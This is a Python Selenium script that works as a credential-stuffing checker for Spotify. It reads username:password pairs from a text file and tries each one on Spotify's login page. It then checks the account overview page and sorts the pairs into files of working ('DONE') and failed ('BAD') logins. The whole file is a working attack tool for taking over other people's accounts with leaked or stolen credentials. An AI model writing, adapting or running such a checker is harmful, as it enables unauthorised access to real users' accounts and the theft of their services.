from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
import time
from bs4 import BeautifulSoup

chrome_options = Options()
#chrome_options.add_argument("--headless")
driver = webdriver.Chrome(options=chrome_options)

def check(user, password):
    """check if the combination works"""
    time.sleep(2)
    driver.get("https://accounts.spotify.com/en/login")
    time.sleep(1.5)
    
    user_elem = driver.find_element(By.ID, "login-username")
    user_elem.clear()
    user_elem.send_keys(user)

    time.sleep(1)

    password_elem = driver.find_element(By.ID, "login-password")
    password_elem.clear()
    password_elem.send_keys(password)

    button_elem = driver.find_element(By.ID, "login-button").click()
    time.sleep(1)

    driver.get("https://www.spotify.com/us/account/overview/")
    parse = BeautifulSoup(driver.page_source, 'html5lib')
    time.sleep(1.5)
    if parse.find_all('h3', {'class': "Type__TypeElement-goli3j-0 fJXsAG sc-c66461a4-1 jKVesB"}):
        espera_aceptar_cookies = driver.find_element(By.ID, "onetrust-accept-btn-handler").click()
        with open("DONE.txt", "a") as done:
            done.write(user + ":" + password + "\n")
        print('{}:{}'.format(user, password)," DONE")
        # done.write("{}:{}".format(user, password))
        # done.write("\n")
        # done.close()
    else:
        with open("BAD.txt", "a") as done:
            done.write(user + ":" + password + "\n")
        # print('{}:{}'.format(user, password)," BAD ")
        # bad.write("{}:{}".format(user, password)).write("\n")
        # bad.close()
        


    # for h3 in parse.find_all('h3', {'class': "Type__TypeElement-goli3j-0 fJXsAG sc-c66461a4-1 jKVesB"}):
    #     time.sleep(1)
    #     pass
    #     #acepta_cookies = driver.find_element(By.ID, "onetrust-accept-btn-handler").click()
    #     # print('{}:{}:{}'.format(user, password, h3.get_text()),"Entro aqui")
    # print('{}:{}'.format(user, password),"Cuenta logueada")
    driver.delete_all_cookies()

with open('spotify.txt') as s:
    for line in s:
        users, passwords = line.split(':')
        check(users.strip(), passwords.strip())
